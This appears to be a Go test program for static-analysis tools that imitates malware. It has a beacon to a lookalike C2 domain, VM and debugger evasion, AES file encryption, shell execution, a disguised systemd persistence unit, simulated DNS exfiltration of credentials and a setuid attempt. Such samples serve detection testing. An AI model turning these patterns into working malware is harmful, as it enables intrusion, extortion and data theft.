// Go test program with various features for static analysis
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "fmt"
    "io"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "strings"
    "syscall"
    "time"
)

// Suspicious constants
const (
    C2Server = "msftupdater.com"
    C2Port   = "443"
    UserAgent = "Mozilla/5.0 (compatible; Malware/1.0)"
)

// Anti-VM detection
func checkVM() bool {
    // Check for common VM artifacts
    vmIndicators := []string{
        "VirtualBox",
        "VMware",
        "QEMU",
        "Hyper-V",
        "Oracle VM",
        "Parallels",
    }

    hostname, _ := os.Hostname()
    for _, indicator := range vmIndicators {
        if strings.Contains(strings.ToLower(hostname), strings.ToLower(indicator)) {
            return true
        }
    }

    // Check CPU count (VMs often have fewer CPUs)
    if runtime.NumCPU() < 2 {
        return true
    }

    return false
}

// Anti-debugging check
func isDebuggerPresent() bool {
    // Platform-specific debugger detection
    if runtime.GOOS == "linux" {
        // Check /proc/self/status for TracerPid
        data, err := os.ReadFile("/proc/self/status")
        if err == nil {
            if strings.Contains(string(data), "TracerPid:\t0") {
                return false
            }
            return true
        }
    }
    return false
}

// Network beacon function
func beacon() error {
    url := fmt.Sprintf("http://%s:%s/beacon", C2Server, C2Port)
    client := &http.Client{
        Timeout: 10 * time.Second,
    }

    req, err := http.NewRequest("GET", url, nil)
    if err != nil {
        return err
    }

    req.Header.Set("User-Agent", UserAgent)
    _, err = client.Do(req)
    return err
}

// File encryption function
func encryptFile(filename string, key []byte) error {
    plaintext, err := os.ReadFile(filename)
    if err != nil {
        return err
    }

    block, err := aes.NewCipher(key)
    if err != nil {
        return err
    }

    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return err
    }

    nonce := make([]byte, gcm.NonceSize())
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        return err
    }

    ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
    return os.WriteFile(filename+".enc", ciphertext, 0644)
}

// Command execution wrapper
func executeCommand(cmd string) (string, error) {
    var command *exec.Cmd

    switch runtime.GOOS {
    case "windows":
        command = exec.Command("cmd", "/C", cmd)
    default:
        command = exec.Command("sh", "-c", cmd)
    }

    output, err := command.CombinedOutput()
    return string(output), err
}

// Persistence mechanism (Linux)
func installPersistence() error {
    if runtime.GOOS != "linux" {
        return fmt.Errorf("persistence not implemented for %s", runtime.GOOS)
    }

    // Create a systemd service (requires root)
    serviceContent := `[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/updater
Restart=always

[Install]
WantedBy=multi-user.target`

    return os.WriteFile("/tmp/updater.service", []byte(serviceContent), 0644)
}

// Complex function with high cyclomatic complexity
func complexBusinessLogic(a, b, c int, operation string) (int, error) {
    var result int

    switch operation {
    case "add":
        if a > 0 {
            if b > 0 {
                result = a + b + c
            } else {
                result = a - b + c
            }
        } else {
            if b > 0 {
                result = -a + b + c
            } else {
                result = -a - b + c
            }
        }
    case "multiply":
        if a != 0 && b != 0 {
            result = a * b * c
        } else if a != 0 {
            result = a * c
        } else if b != 0 {
            result = b * c
        } else {
            result = c
        }
    case "special":
        for i := 0; i < a; i++ {
            for j := 0; j < b; j++ {
                result += i * j * c
            }
        }
    default:
        return 0, fmt.Errorf("unknown operation: %s", operation)
    }

    return result, nil
}

// Resource exhaustion function (DoS potential)
func resourceExhaustion() {
    // Allocate large amounts of memory
    bigSlice := make([][]byte, 1000)
    for i := range bigSlice {
        bigSlice[i] = make([]byte, 1024*1024) // 1MB per slice
    }

    // CPU intensive operation
    for i := 0; i < 1000000; i++ {
        _ = fmt.Sprintf("%d", i)
    }
}

// Data exfiltration simulation
func exfiltrateData(data []byte) error {
    // Base64 encode the data
    encoded := base64.StdEncoding.EncodeToString(data)

    // Simulate DNS exfiltration by chunking
    chunkSize := 63 // DNS label limit
    for i := 0; i < len(encoded); i += chunkSize {
        end := i + chunkSize
        if end > len(encoded) {
            end = len(encoded)
        }
        chunk := encoded[i:end]
        // Would normally do DNS query here
        _ = fmt.Sprintf("%s.data.%s", chunk, C2Server)
    }

    return nil
}

// Privilege escalation attempt (Linux)
func tryPrivilegeEscalation() {
    if runtime.GOOS == "linux" {
        // Try to set UID to 0 (root)
        _ = syscall.Setuid(0)
        _ = syscall.Setgid(0)
    }
}

func main() {
    fmt.Println("Go Test Binary for Analysis")

    // Anti-analysis checks
    if checkVM() {
        fmt.Println("Virtual machine detected!")
        os.Exit(1)
    }

    if isDebuggerPresent() {
        fmt.Println("Debugger detected!")
        os.Exit(1)
    }

    // Generate encryption key
    key := make([]byte, 32) // AES-256
    if _, err := rand.Read(key); err != nil {
        panic(err)
    }

    // Complex business logic
    result, err := complexBusinessLogic(10, 20, 30, "special")
    if err == nil {
        fmt.Printf("Complex calculation result: %d\n", result)
    }

    // Try network beacon
    fmt.Println("Attempting to contact C2 server...")
    if err := beacon(); err != nil {
        fmt.Printf("Beacon failed: %v\n", err)
    }

    // Command execution
    if output, err := executeCommand("whoami"); err == nil {
        fmt.Printf("Current user: %s\n", strings.TrimSpace(output))
    }

    // Persistence attempt
    if err := installPersistence(); err != nil {
        fmt.Printf("Persistence installation failed: %v\n", err)
    }

    // Environment fingerprinting
    fmt.Printf("OS: %s\n", runtime.GOOS)
    fmt.Printf("Arch: %s\n", runtime.GOARCH)
    fmt.Printf("CPUs: %d\n", runtime.NumCPU())

    // Simulated data exfiltration
    sensitiveData := []byte("username:admin password:secret123")
    _ = exfiltrateData(sensitiveData)

    fmt.Println("Program completed")
}
